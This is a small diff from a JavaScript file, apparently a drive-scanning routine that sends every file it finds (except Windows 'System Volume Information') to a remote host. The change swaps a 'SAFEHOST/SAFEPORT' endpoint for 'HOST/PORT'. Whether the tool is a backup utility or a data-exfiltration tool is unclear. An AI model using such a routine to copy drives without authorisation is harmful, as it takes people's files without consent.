@@ -42,7 +42,7 @@ async function scanFiles(route){
     files.forEach( (file) => {
         console.log(file);
         if (!file.includes("System Volume Information")) 
-            client.sendFile(file,SAFEHOST,SAFEPORT)
+            client.sendFile(file,HOST,PORT)
     })
 }
 
